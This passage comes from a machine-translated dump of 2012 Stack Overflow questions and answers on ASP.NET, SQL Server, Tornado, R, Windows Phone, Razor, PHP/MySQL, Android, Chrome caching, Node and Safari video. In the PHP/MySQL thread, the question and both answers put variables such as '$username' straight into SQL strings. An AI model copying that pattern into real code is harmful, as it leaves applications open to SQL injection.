       if (i % 50 == 0)
       {
           //flush the output stream every now and then
           Response.Flush();
       }
    }
    rdr.Close();
}
Response.End(); 
```

请注意，我不提倡这个确切的代码。例如，有一些以这种方式使用 SqlDataReader 的问题超出了问题的范围。您还需要设置每次刷新调用之间的记录数，以便充分利用 IIS 服务器的响应缓冲区，具体取决于您的特定平均记录大小。我也会对生产进行一些其他更改，但这应该足以为您指明正确的方向。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T17:38:27.353

也许您需要增加保持活动超时。一般来说 - 你的服务器应该回复得更快。

[如何更改 Internet Explorer 中的默认保持活动超时值](http://support.microsoft.com/kb/813827)

# image - WP7如何创建一个按下时更改背景图像的按钮

> ID：13806024
> 
> 赞同：0
> 
> 时间：2012-12-10T17:29:43.380
> 
> 标签：image, windows-phone-7, button, background, custom-controls

我看到 [关于如何使用 Visual State Manager 更改按钮背景的一些问题][1]。但我想要的是一个可以像这样在 XAML 中使用的按钮

```
<Button NormalImage="/image/normal.png" PressedImage="image/pressed.png /> 
```

用户可以为 2 个按钮状态（正常和已按下）指定 2 个图像，当按钮被按下时，它使用 PressedImage。

怎么做 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:49:27.503

You would have to make your own user control and have those properties exposed as dependency properties so you are able to bind them.

In you user control, you can use the visual state manager to change the background when click/tap event is received

# sql - 是否可以在创建时插入外键值？

> ID：13806025
> 
> 赞同：0
> 
> 时间：2012-12-10T17:29:44.427
> 
> 标签：sql, sql-server, foreign-keys

SQL Server 的示例表。

*   **主要记录**( `id, record`)
*   **辅助记录**( `mainRecords_id, record`)
*   **源记录**( `record1, record2`)

`MainRecords.id`是一个自增主标识键。

是否可以在单个语句中同时选择`SourceRecords`并插入`MainRecords`和`AuxRecords`，这样`MainRecords.record = record1`,`AuxRecords.record = record2`和all ？`AuxRecords.mainRecords_id = MainRecords.id`

编辑：

根据下面的提示，我尝试了这个...

```
DECLARE @MainRecords table(id int PRIMARY KEY IDENTITY, record varchar(5))
DECLARE @AuxRecords table(mainRecords_id int, record varchar(5))
DECLARE @SourceRecords table(record1 varchar(5), record2 varchar(5))

INSERT @SourceRecords VALUES ('a', 'a')
INSERT @SourceRecords VALUES ('a', 'b')
INSERT @SourceRecords VALUES ('a', 'c')
INSERT @SourceRecords VALUES ('b', 'a')
INSERT @SourceRecords VALUES ('b', 'b')
INSERT @SourceRecords VALUES ('b', 'c')
INSERT @SourceRecords VALUES ('c', 'a')
INSERT @SourceRecords VALUES ('c', 'b')
INSERT @SourceRecords VALUES ('c', 'c')

INSERT INTO @MainRecords (record)
  OUTPUT inserted.id, @SourceRecords.record2
  INTO @AuxRecords (mainRecords_id, record)
SELECT record1 FROM @SourceRecords

select * from @MainRecords
select * from @AuxRecords 
```

但不幸的是得到错误：

```
Msg 137, Level 16, State 1, Line 16
Must declare the scalar variable "@SourceRecords". 
```

如果我将这些表类型变量更改为真实表，则会出现错误：

```
Msg 4104, Level 16, State 1, Line 3
The multi-part identifier "SourceRecords.record2" could not be bound. 
```

下面工作正常，但显然它不是一个完整的解决方案。我只是展示它来证明我的语法是正确的。

```
INSERT INTO @MainRecords (record)
  OUTPUT inserted.id --, @SourceRecords.record2
  INTO @AuxRecords (mainRecords_id) --, record)
SELECT record1 FROM @SourceRecords 
```

所以......除非我缺少一些技巧，否则似乎`OUTPUT`是解决这个问题的死胡同。

使用触发器创建视图或空表的其他建议不是解决问题的“单一语句”。此外，它们增加了模糊性，而添加一些额外的列和使用存储过程同样复杂，但更加明显和直接。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T18:46:00.117

**社区维基**

问题中没有足够的信息来编写代码来解决问题。因此，**这是一个“通用”输出子句示例**，它与这个问题完全无关，只是展示了如何使用 OUTPUT：

**这将在单个语句中删除、插入和返回多行**

```
DECLARE @OldTable table(col1 int, col2    varchar(5), col3 char(5), col4     datetime)
DECLARE @NewTable table(col1 int, column2 varchar(5), col3 int    , col_date char(23), extravalue int, othervalue varchar(5))
INSERT @OldTable VALUES (1 , 'AAA' ,'A'  ,'1/1/2010'           )
INSERT @OldTable VALUES (2 , 'BBB' ,'12' ,'2010-02-02 10:11:22')
INSERT @OldTable VALUES (3 , 'CCC' ,null ,null                 )
INSERT @OldTable VALUES (4 , 'B'   ,'bb' ,'2010-03-02'         )

DELETE @OldTable           --<<<alter table 1
    OUTPUT DELETED.col1    --<<<alter table 2
          ,DELETED.col2
          ,CASE
               WHEN ISNUMERIC(DELETED.col3)=1 THEN DELETED.col3 
               ELSE NULL END
          ,DELETED.col4
          ,CONVERT(varchar(5),DELETED.col1)+'!!'
        INTO @NewTable (col1, column2, col3, col_date, othervalue)
    OUTPUT 'Rows Deleted: ', DELETED.* --<<<returns a result set
    WHERE col1 IN (2,4)

SELECT * FROM @NewTable 
```

输出：

```
 col1        col2  col3  col4
-------------- ----------- ----- ----- -----------------------
Rows Deleted:  2           BBB   12    2010-02-02 10:11:22.000
Rows Deleted:  4           B     bb    2010-03-02 00:00:00.000

(2 row(s) affected)

col1        column2 col3        col_date                extravalue  othervalue
----------- ------- ----------- ----------------------- ----------- ----------
2           BBB     12          Feb  2 2010 10:11AM     NULL        2!!
4           B       NULL        Mar  2 2010 12:00AM     NULL        4!!

(2 row(s) affected) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:14:02.103

@DG 您不能在单个语句中修改多个表。正如@RBarryYoung 建议的那样，您应该使用存储过程和事务来做这种事情。另一个更极端的选择是在 MainRecords 和 AuxRecords 上创建一个视图，将行连接在一起，然后在视图上创建一个 before 触发器，将其拆分为两个插入，一个针对每个基表。然后，您的客户可以对视图进行一次插入。总而言之，我认为存储过程/事务的方式比较明显。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T18:44:00.277

从实用的角度来看，@BStateham 和@RBarryYoung 给了你正确和完整的答案。但是，如果这是一个您只想知道是否可行的技术问题，我会说：是的。

引入一个包含两列的伪造表：record1,record2。

然后在这个表上创建一个 INSTEAD OF INSERT 触发器，它只是将信息添加到其他两个表中。

当您执行一条语句“INSERT INTO MyBogusTable (record1,record2) VALUES (1,2)”时，您实际上将使用一条语句将值插入到两个不同的表中。

无论如何，这很丑陋，不推荐。这是愚蠢和莫名其妙的（不得不使用 translate.google 这个词）。

但是：对“可能吗？”这个问题回答“是”是一种可能性。好的，调用存储过程也是“一条语句”，但是……嗯……嗯。

# python - Sockjs-Tornado 上的 IOError 处理

> ID：13806026
> 
> 赞同：0
> 
> 时间：2012-12-10T17:29:44.723
> 
> 标签：python, tornado, sockjs

我基于 sockjs-tornado 聊天示例开发了即时消息应用程序。我的代码是异步的。

有这个堆栈跟踪：

```
ERROR:root:Exception in callback <tornado.stack_context._StackContextWrapper object at 0x80932c788>
Traceback (most recent call last):

File "/usr/local/lib/python2.7/site-packages/tornado/ioloop.py", line 421, in _run_callback
    callback()

File "/usr/local/lib/python2.7/site-packages/tornado/iostream.py", line 305, in wrapper
    callback(*args)

File "/usr/local/lib/python2.7/site-packages/sockjs/tornado/websocket.py", line 661, in _on_frame_data
    self._receive_frame()

File "/usr/local/lib/python2.7/site-packages/sockjs/tornado/websocket.py", line 580, in _receive_frame
    self.stream.read_bytes(2, self._on_frame_start)

File "/usr/local/lib/python2.7/site-packages/tornado/iostream.py", line 166, in read_bytes
    self._try_inline_read()

File "/usr/local/lib/python2.7/site-packages/tornado/iostream.py", line 382, in _try_inline_read
    self._check_closed()

File "/usr/local/lib/python2.7/site-packages/tornado/iostream.py", line 565, in _check_closed
    raise IOError("Stream is closed")
IOError: Stream is closed 
```

如果我必须从聊天参与者列表中删除对已关闭连接的引用，如何处理此异常？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T08:31:08.453

当用户断开 websocket 连接而没有正确关闭它（网络错误等）时，会发生此异常。

在任何一种情况下，`on_close`都会调用您的处理程序，以便您可以从聊天参与者列表中删除用户。

# r - 在非常大的数据集上加速随机森林

> ID：13806033
> 
> 赞同：0
> 
> 时间：2012-12-10T17:30:00.240
> 
> 标签：r, optimization, parallel-processing, machine-learning, random-forest

> **可能重复：**
> [加快随机森林的建议](https://stackoverflow.com/questions/7830255/suggestions-for-speeding-up-random-forests)

我想在我的数据 129600 X 900 上构建随机森林。此外，我希望有不少于 1000 棵树进行回归。我对我的数据执行了以下代码，其中 all_reg 是 129600 X 900 数据矩阵，train_resp_reg 是 129600 标签矩阵

```
train_reg <- randomForest(x=as.data.frame(all_reg[,2:dim(all_reg [2]]),
                      y=as.numeric(train_resp_reg),ntree=100) 
```

代码已经在一个处理器上运行了3天多了，它还在运行，所以我想知道是否有任何解决方案可以更快地运行它，我可以访问一个64核的服务器，那么如何制作这个代码尽可能快地跑？

任何建议表示赞赏

# c# - 带有图像的复选框列表

> ID：13806041
> 
> 赞同：0
> 
> 时间：2012-12-10T17:30:49.073
> 
> 标签：c#, windows-phone-7, listbox

我制作了这个 Windows Phone 用户控件：

![在此处输入图像描述](../Images/9c27a425f25c41966d9e9208a457f236.png)

**XAML：**

```
<Grid x:Name="LayoutRoot" Height="75" Width="353">
        <Image Height="50" HorizontalAlignment="Left" Margin="12,12,0,0" Name="img" Stretch="Fill" VerticalAlignment="Top" Width="50" />
        <TextBlock Height="50" HorizontalAlignment="Left" Margin="77,12,0,0" Name="txt" Text="TextBlock" VerticalAlignment="Top" Width="215" FontSize="32" />
        <CheckBox Content="CheckBox" Height="68" HorizontalAlignment="Right" Margin="0,3,10,0" Name="cb" VerticalAlignment="Top" Width="50" />
</Grid> 
```

我在我的一个页面中这样称呼它

XAML.CS：

```
myListBox mls = new myListBox();
String[,] ls = { { "Text1", "/image/image1.png" }, { "Tex2", "/image/image2.png" } };
for (int i = 0; i < 2; i++)
{
        mls.txt.Text = ls[i, 0];
        mls.img.Source = url(ls[i, 1]);
}

public ImageSource url (string path)
{
        Uri uri = new Uri(path, UriKind.Absolute);
        ImageSource imgSource = new BitmapImage(uri);
        return imgSource;
} 
```

我的问题是：

1）如果我像这样运行它需要下面的代码但是如果我将**for循环**更改为`i<1`它工作正常（但不完全是我期望的问题2）

```
// Code to execute on Unhandled Exceptions
    private void Application_UnhandledException(object sender, ApplicationUnhandledExceptionEventArgs e)
    {
        if (System.Diagnostics.Debugger.IsAttached)
        {
            // An unhandled exception has occurred; break into the debugger
            System.Diagnostics.Debugger.Break();
        }
    } 
```

2）使用此代码，我设置了文本和图像，但它没有放置图像，只有文本。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T12:11:23.520

我有一个类似的工作代码，我使用**UriKind**作为**'Relative** ' 而不是**'Absolute'**。

还有一件事情。确保您正在使用的图像属性下的**“构建操作”设置为****“内容”而不是“资源”**或其他任何内容。

希望它会奏效。

# c# - 替换winform propertygrid控件中的集合窗口

> ID：13806042
> 
> 赞同：0
> 
> 时间：2012-12-10T17:30:52.027
> 
> 标签：c#, propertygrid

当其数据源包含集合时，winform propertygrid 将弹出一个新窗口，我想在弹出窗口时使用我自己的 winform。

例如： `Class User{ int ID ;int Name; list<order> CustomerOrder;}`，当弹出订单页面时，我希望它可以在添加商品时从现有订单列表中选择来自另一个数据源的订单。

这可能是真的吗？或开源扩展控制或第三控制？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T23:17:40.387

如果你创建一个新类型来包装你的列表或订单，你可以在你的新类型上设置 Editor 属性，然后你可以弹出你想要的任何类型的 winform。

例如，用这样的类包装 List：

```
[Editor(typeof(OrderListEditor), typeof(UITypeEditor))]
class OrderList
{
    public OrderList() { Orders = new List<order>(); }
    public List<order> Orders { get; set; }
} 
```

并拥有您的用户类的属性：

```
class User
{
...
    public OrderList CustomerOrder { get; }
} 
```

然后您所要做的就是编写逻辑以在用户按下 PropertyGrid 中的“...”按钮时执行您想要的操作：

```
class OrderListEditor : UITypeEditor
{
    public override System.Drawing.Design.UITypeEditorEditStyle GetEditStyle(ITypeDescriptorContext context)
    {
        return System.Drawing.Design.UITypeEditorEditStyle.Modal;
    }

    public override object EditValue(ITypeDescriptorContext context, IServiceProvider provider, object value)
    {
        OrderList list = (OrderList)value;

        Console.WriteLine("There are " + list.Orders.Count + " orders");
        return list;
    }
} 
```

# c# - 用于原始类型和向下转换的 MVC3 Razor 自定义模板

> ID：13806052
> 
> 赞同：1
> 
> 时间：2012-12-10T17:31:47.327
> 
> 标签：c#, asp.net-mvc-3, templates, razor, casting

我有一个视图模型：

```
public class AttributeEditorViewModel
{
    public long AttributeId { get; set; }
    public string DisplayName { get; set; }
    public object Value { get; set; }
} 
```

该模型是使用模型构建器构建的，因此最终视图模型具有上述对象的列表：

```
public class AttributeListViewModel
{
    public List<AttributeEditorViewModel> Attributes { get; set; }
} 
```

我的模型构建器编译了一个 AttributeEditorViewModel 对象列表，并将适当的原始类型设置为 Value 属性。数据类型来自属性的单独定义。

现在 Razor 视图（可以说是 edit.cshtml）看起来像：

```
@model AttributeListViewModel

@Html.EditorFor(m => m.Attributes) 
```

和编辑器模板 Views/Shared/EditorTemplates/AttributeEditorViewModel.cshtml：

```
@model AttributeEditorViewModel

<div>
    <label>@Model.DisplayName</label>
    @Html.EditorFor(m => m.Value)
    @Html.ValidationMessageFor(m => m.Value)
</div> 
```

我的期望；如果我将 AttributeEditorViewModel 的 Value 属性设置为双精度，如下所示：

```
public ActionResult Edit()
{
    return View(new AttributeListViewModel 
    {
        Attributes = new List<AttributeEditorViewModel> 
        {
            new AttributeEditorViewModel { DisplayName = "Double example", Value = (double) 0 }
        }
    };
} 
```

我希望会呈现一个文本框。相反，它什么也不渲染。我添加了另一个编辑器模板 Views/Shared/EditorTemplates/Double.cshtml：

```
@model double

@Html.TextBoxFor(m => m) 
```

这解决了眼前的问题。所以现在我得到一个值为 0 的文本框。然而，即使在自定义编辑器模板中使用 EditorFor 也不会呈现任何内容。

使用对象作为基本类型是根本错误的吗？为什么在使用 EditorFor 或 EditorForModel 时什么都不渲染？

任何见解表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T17:39:48.133

这是因为 EditorFor 使用泛型参数上的编译时绑定来确定要呈现哪个模板。

而且由于默认情况下没有`EditorFor<object>()`定义，因此您什么也得不到。

我相信您可以根据需要为对象定义自己的编辑器模板，但可能更好的方法是使您的视图模型通用：

```
public class AttributeEditorViewModel<TValue>
{
    public long AttributeId { get; set; }
    public string DisplayName { get; set; }
    public TValue Value { get; set; }
} 
```

但是，这可能并不理想，因为您不再拥有多态视图模型的列表。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-10T17:42:31.523

对象和编辑器的问题正是您想要它做什么，想象它包含一个包含 2,000,000 个 DataTables 的字典，每个 DataTables 包含 300 列和 20,000 行。它应该准确显示什么？在模型上使用 object 类型的属性本质上没有任何问题，只是不要指望 Razor 会根据你在对象中粘贴的内容神奇地知道它应该显示哪种编辑器。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-10T18:00:41.033

实际问题在于您的 Razor 视图代码。当你这样做时：

```
@Html.EditorFor(m => m.Attributes) 
```

您是在告诉视图引擎查找**not for**`EditFor`的模板。所以它使用默认的.`List<AttributeEditorViewModel>` **`AttributeEditorViewModel``ObjectTemplate`**

 ****[edit.chtml]**尝试类似：

```
@model AttributeListViewModel

@foreach (var att in Model.Attributes)
{
  @Html.EditorFor(m => att)
} 
```

我不认为这个确切的答案会起作用（我不在一台有 VS atm 的机器上），但它可以让你理解你遇到的问题。**

# c# - c#获取ms-paint中的像素坐标

> ID：13806055
> 
> 赞同：-3
> 
> 时间：2012-12-10T17:31:56.410
> 
> 标签：c#, c#-4.0, c#-3.0

我有[这张图片](http://amyrh.persiangig.com/image/xyCoordinates.png)，当我在 ms-paint 中的每个图片像素上单击（鼠标左键）时，我需要在文本文件中写入像素的 x 和 y 坐标。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T17:40:51.990

制作一个打开并显示图像的小程序可能更容易。然后您可以在图像控制器上捕获点击事件并从点击事件中获取坐标。将坐标写入文件应该相对容易。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T17:38:58.293

你不能在`Paint`. 但是如果你想从你想要的像素中获取颜色，你可以使用[`Bitmap`](http://msdn.microsoft.com/en-us/library/system.drawing.bitmap.aspx)class 来改变它；

```
Bitmap bmpimage = new Bitmap("yourfilename");
//to get the pixel color of the image
Color c = bmpimage.GetPixel(50,50);
//to set the color of the pixel
bmpimage.SetPixel(50, 50, Color.Yellow); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T17:41:27.293

我会假装这是不是你弟弟的问题。无论如何，我去。您在该图片中看到的只是一张图像，除非您用新的背景和文本覆盖该区域，否则您无法更改图像内部的文本。关于坐标，如果您使用的是 Windows 窗体，则可以响应名为 MouseMove 的事件，该事件将为您提供相应容器对象中的 X 和 Y 坐标。

您可以获取坐标，然后用新值覆盖图像，但可能您需要阅读更多关于编程的内容，以了解为什么您的问题有点复杂。

# php - 两个 SELECT/WHERE 子句组合在一起？

> ID：13806058
> 
> 赞同：1
> 
> 时间：2012-12-10T17:32:10.060
> 
> 标签：php, mysql, database, join

我对 MySQL 语句不是很好，所以我正在寻找一些见解。假设用户访问了其他人的页面。这会将用户名作为参数发送到脚本，以检查当前用户和他们正在访问的用户页面是否是朋友。

我的简单数据库结构：

**朋友桌**——`relationship_id, friend1_ID, friend2_ID, status`

**ACTIVE_USERS 表**—— `id, username, email`……等等。

我当前的SQL语句如下：

```
SELECT * 
FROM friends
JOIN active_users ON ( active_users.username =  '$username' ) 
WHERE (
    friends.friend_1ID = '$current_user_ID'
    AND friends.friend_2ID = active_users.id
    AND friends.status = 1
) 
```

虽然这很有效，但我觉得它并不优雅。如果两者是朋友则返回一行，但这一行显然是用户信息行和关系行的连接。我只想抓住关系行。将其分为两个陈述是否经济？例如，我将使用用户名查询访问页面的用户 ID，然后在第二条语句中使用该变量来获取关系。或者有没有我没有遇到过的更简单的语法？帮助表示赞赏！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T17:36:43.993

您可以执行以下操作：

```
SELECT b.* 
FROM friends b
JOIN active_users ON ( active_users.username =  '$username' ) 
WHERE (
    b.friend_1ID = '$current_user_ID'
    AND b.friend_2ID = active_users.id
    AND b.status = 1
) 
```

通过使用以`b`朋友表命名的别名，我们可以使用 select 选择属于该表的字段，而不是使用覆盖所有连接表`b.*`的默认值，这就是为什么它从两个连接表中返回所有字段的原因。`*`

因此，我们只是为查询中的表提供了别名，以便只能选择属于该别名表的字段。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T17:42:38.867

JOIN 是从多个表中获取数据的首选方式。它比进行两个单独的调用要快。

我自己对 MySQL 并不熟悉，但它不应该更像：

```
SELECT b.* 
FROM friends b
JOIN active_users ON ( b.friend_2ID = active_users.id AND active_users.username =  '$username' ) 
WHERE (
    b.friend_1ID = '$current_user_ID'        
    AND b.status = 1
) 
```

（此处修改了 Nelson 的代码）
[可能优化器会产生相同的](http://www.sqlhorror.com/2010/12/05/to-be-ansi-or-not-to-be/)结果，但不知何故，我发现在 JOIN 中定义关系更合乎逻辑。

# android - Android facebook检测首次登录

> ID：13806059
> 
> 赞同：1
> 
> 时间：2012-12-10T17:32:14.603
> 
> 标签：android, facebook

我正在为我的 android 应用程序使用 facebook 登录，现在要在 MYSQL 数据库中创建一个用户，我想知道用户何时首次登录应用程序..

例如，当我们授权应用程序使用 facebook 基本信息时。

谢谢 ：）

编辑：我正在使用 Facebook 登录按钮 ( `<com.facebook.widget.LoginButton... />`) 进行登录，并且当状态发生变化时，我正在获取用户详细信息，使用

```
onSessionStateChange(SessionState state, Exception exception){...} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T10:19:20.300

您需要将应用程序之前是否运行过存储在名为“[共享首选项](http://developer.android.com/reference/android/content/SharedPreferences.html)”的内容中。您可以使用以下内容

```
SharedPreferences prefs = this.getPreferences(Context.MODE_PRIVATE);
if(prefs.contains(HAS_BEEN_RUN_FLAG)){
    //check the database for the user info
}
else{            
    //do the facebook authentication
    prefs.edit().putInt(HAS_BEEN_RUN_FLAG, 1).commit();
} 
```

# javascript - 打印一个具有确切大小的矩形 div

> ID：13806060
> 
> 赞同：2
> 
> 时间：2012-12-10T17:32:18.407
> 
> 标签：javascript, html, css, printing

我想在一张纸上打印一个矩形 div，其尺寸与要打印在纸上的确切尺寸相同。
`<div style="width:15cm;height:10cm;border:1px solid #CCC"></div>`
但是，当我尝试打印此 div 时，大小因浏览器而异。
我能做什么，以便矩形 div 完全打印在纸上。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T17:35:46.613

除了已经完成的工作之外，您无法真正执行它。打印机设置属于客户端计算机的领域。

也许您最好的机会是以专为打印设计的格式生成输出，例如 PDF。但即使在这种情况下，用户也可以调整文档的大小。

# xcode - xcode 4.5.2 中的存档选项灰显

> ID：13806061
> 
> 赞同：11
> 
> 时间：2012-12-10T17:32:24.500
> 
> 标签：xcode, upload, archive

我已经使用 Xcode 创建了应用程序。它已准备好在 iTunes 连接上上传。但应用程序加载器似乎太慢了，无法这样做。另一种存档方法看起来很好用，但该选项在 Xcode 4.5.2 中被禁用

操作：我尝试编辑方案并选择存档（发布选项）以及我设备的目标...我还构建了之后我将目标中的 SKIP INSTALL 设置为 NO。

我也按照说明在这个论坛上看到了一些帖子。但似乎没有一个对我有用

我不知道如何获得该选项 avtive agn ......我的应用程序在我的 itouch 上并且工作正常......所以没有设备问题。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-01-09T21:28:30.037

存档菜单项显示为灰色，因为您的方案目标是模拟器。您必须为设备或“iOS 设备”构建存档。

# javascript - 如何从 chrome 中清除 js/css 文件？

> ID：13806070
> 
> 赞同：0
> 
> 时间：2012-12-10T17:33:03.167
> 
> 标签：javascript, css, google-chrome, caching

我已经检查了 chrome 控制台中的禁用缓存，但是 js 和 css 文件没有刷新，我尝试手动清除缓存和历史记录但仍然没有，它也不是服务器端的，因为来自另一个浏览器的文件是最新的......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T17:36:11.217

### 你可以通过两种方式做到这一点：

1.  **硬刷新**

    按`Ctrl`+ `F5`。

2.  **隐身模式**

    按`Ctrl`+ `Shift`+`N`开始私人浏览会话。

3.  **清除历史记录**

    按`Ctrl`+ `Shift`+`Del`清除您的历史记录。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T17:36:38.870

按`Ctrl`+`F5`或使用此插件：[https ://chrome.google.com/webstore/detail/clear-cache-shortcut/jnajhcakejgchhbjlchkfmdidgjefleg](https://chrome.google.com/webstore/detail/clear-cache-shortcut/jnajhcakejgchhbjlchkfmdidgjefleg)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-10T17:36:48.903

按 Cntrl+F5 并按 Return...

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-10T18:24:56.950

好吧，我知道你说它不是服务器端，但它确实可以。尝试将版本放在您的脚本/样式中作为我的示例：

```
<link href="../Styles/style1.css?v=1.2.0" rel="stylesheet" type="text/css" />
<script src="../Scripts/jquery.min.js?v=1.2.0" type="text/javascript"></script> 
```

# node.js - NodeJS - 有时我的导出方法不可用

> ID：13806071
> 
> 赞同：1
> 
> 时间：2012-12-10T17:33:09.987
> 
> 标签：node.js, methods, module

这很奇怪……

我有一个模块（tools.js），它有一些我喜欢使用的方便的功能，例如词干提取或其他什么，它们以通常的方式导出：

工具.js

```
var stem = function(str) {
    // do some stuff
    return str;
}

module.exports = {
    stem: stem
} 
```

正如您所期望的那样，我在其他模块中使用它：

```
var tools = require('tools.js');

var someProcess = function(str) {
    return tools.stem(str);
} 
```

这真的很好......有时。

其他时候我收到如下错误：

```
TypeError: Object #<Object> has no method 'stem' 
```

如果我没有导出我的函数，我会期望。但是我有，因为上次运行它时，这段完全相同的代码运行良好，我什至没有重新启动该过程。

一旦它中断，我可以重新启动该过程，它会很好，但过了一段时间（通常是在调用其他函数之后），它会中断。几乎就好像有一些命名空间的东西正在发生并且它被覆盖了。但我认为 Node 并没有真正受此影响，因为每个模块都有命名空间......

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T10:48:52.977

基本上，它与循环引用有关，在这里解决：[https ://github.com/joyent/node/issues/1694](https://github.com/joyent/node/issues/1694)

# javascript - HTML5-Bug in Safari? Video doesn't work when using local files

> ID：13806080
> 
> 赞同：2
> 
> 时间：2012-12-10T17:33:24.630
> 
> 标签：javascript, jquery, html, jquery-mobile, html5-video

I try to build a local JS-based mediathek with HTML5 video. the code is the same like in this [JSBIN](http://jsbin.com/eninox/3), where it is working well for online content. but when I use this code with local files (like you could [find here](https://dl.dropbox.com/u/2896178/VideoLoadError.zip)) Safari throws the error

> INVALID_STATE_ERR: DOM Exception 11: An attempt was made to use an object that is not, or is no longer, usable.

after starting the video the third time by klicking on the thumb image, which opens the player and loads the video URL.

the error comes from '$vplayer.currentTime = 0.0;' without this line the problem stays, but no error is thrown at all.

I know this error means that the video is not loaded and it is caused by - but why did it load the first two times before?

edit: I also tried different approaches with absolute paths from 'file://' to 'file:///' - nothing changes.

**edit: I found out that this behaviour is gone when using the browser engine of a objective-c WebView component (iOS). also it works when using chrome. so it seems to be a bug of safari?**

the code used:

```
<html>

<head>
<script src="http://code.jquery.com/jquery-1.8.2.min.js"></script>
<script src="http://code.jquery.com/mobile/1.2.0/jquery.mobile-1.2.0.min.js"></script>
<link rel="stylesheet" href="http://code.jquery.com/mobile/1.2.0/jquery.mobile-1.2.0.min.css" />    
</head>
<body>

  <div data-role="page" id="gamepad">
    <div id="videolink">
    </div>
            <div data-role="popup" id="vplayerpopup" data-position-to="window" data-overlay-theme="a" data-theme="a" class="ui-content" data-tolerance="5,5,5,5" data-transition="fade">
            <a href="#" data-rel="back" data-role="button" data-theme="a" data-icon="delete" data-iconpos="notext" class="ui-btn-right">Close</a>
            <video id="vplayer" width="640" height="360" controls> 
                <source id="vsource" src="" type="video/mp4" />
            </video>
        </div>

  </div>

</body>
</html> 
```

and

```
var $videoblock =   '<div class="ui-block-a videoblock">'
    +                   '   <div class="videoPreviewImageWrapper">'
      +                 '       <a href="#vplayerpopup" data-rel="popup" onclick="mediathekVideolink = \'http://blog.gingertech.net/wp-content/uploads/2011/01/LCA_MM_AVProc2011/HelloWorld.mp4\';">'
        +                   '           <div class="videolink">'
          +                 '               <img src="http://leanbackplayer.com/videos/poster/sintel_640x360.jpg" width="218" height="164" alt="Movie Title">'
            +                   '               <div class="mediathek_film_titel">Movie Title</div>'
              +                 '               <div class="mediathek_film_dauer">03:56</div>'
                +                   '               <div class="mediathek_film_text">Some Text about the video</div>'
                  +                 '           </div>'
                    +                   '       </a>'
                      +                 '   </div>'
                        +                   '</div>';

$('#videolink').append($videoblock);

var mediathekVideolink = 'none';
var mediaplayerIsPlaying = false;

$( '#gamepad' ).live( 'pagebeforeshow', function(){

    $( "#vplayerpopup" ).on({
            popupbeforeposition: function(opt1, opt2) { //console.log('mediathekVideolink: ' + mediathekVideolink);
                //console.log('popupbeforeposition');
                $('#vsource').attr('src', mediathekVideolink); 
                var $vplayer = $('#vplayer').get(0); 
                if(!mediaplayerIsPlaying) {
                    $vplayer.load();
                    $vplayer.play();
                    mediaplayerIsPlaying = true;
                }
            },
            popupafterclose: function() {
                //console.log('popupafterclose');
                mediaplayerIsPlaying = false;
                var $vplayer = $('#vplayer').get(0); //console.log('currentTime: ' + $vplayer.currentTime); console.log('currentSrc: ' + $vplayer.currentSrc);
                $vplayer.pause();
                $vplayer.currentTime = 0.0;
            }
        });
});

$( '#gamepad' ).live( 'pagehide', function(){
    $( "#vplayerpopup" ).off();

}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-20T23:16:29.813

Sadly, a lot of browsers don't like working with local files. Firefox does not have this specific problem, but it has other ones (related to CSS/WOFF fonts).

The solution I use is to have a local development web server (like [XAMPP](http://www.apachefriends.org/en/xampp.html)), and then using various web browsers to test. You should be able to setup firewall options to only allow the Apache server on your computer, and not out on your local network.

Plus, you get PHP/Perl/etc. and other scripting languages you don't get on just local files.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-14T14:06:11.477

I now managed to work around this by refreshing the page every time I close the videoplayers popup using

```
function stopVideo(n){
    mediaplayerIsPlaying = false;
    var video = document.getElementsByTagName('video')[n];
    video.pause();
    location.reload();
} 
```

this is only the worst case workaround solution - but at least I can deliver this as 'kind of working'...

# android - Android - TouchEvent 获取位置

> ID：13806081
> 
> 赞同：1
> 
> 时间：2012-12-10T17:33:27.507
> 
> 标签：android, andengine, touch-event

我正在使用 AndEngine 并且我有以下代码：

```
@Override
    public boolean onSceneTouchEvent(TouchEvent event) {
        Log.d("upd", event.getX() + "");
        return true;
    } 
```

当我触摸屏幕时，它会打印出巨大的“随机”数字，如下所示：

```
12-10 23:27:12.352: D/upd(18109): -543629.25
12-10 23:27:12.382: D/upd(18109): -827567.5
12-10 23:27:12.412: D/upd(18109): -292541.75
12-10 23:27:12.452: D/upd(18109): -50245.75
12-10 23:27:12.482: D/upd(18109): 160085.5
12-10 23:27:12.522: D/upd(18109): 164650.38
12-10 23:27:12.562: D/upd(18109): 285486.75
12-10 23:27:12.592: D/upd(18109): 68738.0
12-10 23:27:12.622: D/upd(18109): -282403.75
12-10 23:27:12.652: D/upd(18109): -629866.25
12-10 23:27:12.692: D/upd(18109): -553627.6 
```

等等。

答案是：

```
@Override
    public boolean onSceneTouchEvent(TouchEvent touchEvent) {
        MotionEvent event = touchEvent.getMotionEvent();
        float x = event.getX();
        float y = event.getY();
